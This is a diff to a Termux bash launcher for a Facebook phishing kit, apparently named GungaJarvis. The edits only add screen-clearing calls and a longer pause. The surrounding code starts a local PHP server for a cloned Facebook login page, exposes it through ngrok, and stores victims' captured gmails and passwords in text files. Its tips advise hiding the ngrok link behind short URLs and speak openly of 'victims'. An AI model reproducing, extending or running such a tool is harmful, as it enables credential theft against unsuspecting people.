@@ -1,4 +1,5 @@
 #! /data/data/com.termux/files/usr/bin/bash
+clear
 arr[0]='\nCaution: More than 50 gmails and 50 passwords are not stored, for storage purposes.\n\n'
 arr[1]='\nCaution: You cannot use a single server for many victims.\n\n'
 arr[2]='\nTip: You can use "short urls" to change your ngrok url.\n\n'
@@ -6,9 +7,10 @@ arr[3]='\nCaution: Dont rename your files.\n\n'
 arr[4]='\nCaution: Dont move GungaJarvis to any other directory other than "home".\n\n'
 rand=$[ $RANDOM % 5 ]
 echo -e "${arr[$rand]}"
-sleep 2
+sleep 4
 
 check_files() {
+clear
 cd $HOME/GungaJarvis/utils/phishing/websites/facebook/
 if [[ -e gmail.txt && -e pass.txt && -e process.php && -e style.css && -e index.html && -e facebook.sh && ip.php && ip.txt ]]; then
 echo '' >/dev/null 2>&1
@@ -20,6 +22,7 @@ fi
 check_files
 
 stop() {
+clear
 echo -e 'Stopping the server'
 killall ngrok
 echo ''
@@ -29,6 +32,7 @@ echo -e 'Php stopped...'
 }
 
 requirements() {
+clear
 command -v php > /dev/null 2>&1 || { echo >&2 "php is required which is not installed, Please install it. Exiting."; exit 1; }
 command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip command is required which is not installed, Please install it. Exiting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "wget is required which is not installed, Please install it. Exiting."; exit 1; }
@@ -36,6 +40,7 @@ command -v wget > /dev/null 2>&1 || { echo >&2 "wget is required which is not in
 requirements
 
 check_ngrok() {
+clear
 cd $HOME
 if [[ -f ngrok ]]; then
 echo ''
@@ -76,6 +81,7 @@ fi
 check_ngrok
 
 start_server() {
+clear
 echo -e 'Starting server....'
 cd $HOME/GungaJarvis/utils/phishing/websites/facebook
 php -S 127.0.0.1:3333 > /dev/null 2>&1 &
@@ -97,6 +103,7 @@ echo -e '\n\n'
 start_server
 
 transfer_items() {
+clear
 cd $HOME/GungaJarvis/utils/phishing/websites/facebook
 while true
 do
@@ -120,6 +127,7 @@ done
 transfer_items
 
 cleaner() {
+clear
 cd $HOME/GungaJarvis/utils/phishing/websites/facebook
 while true
 do
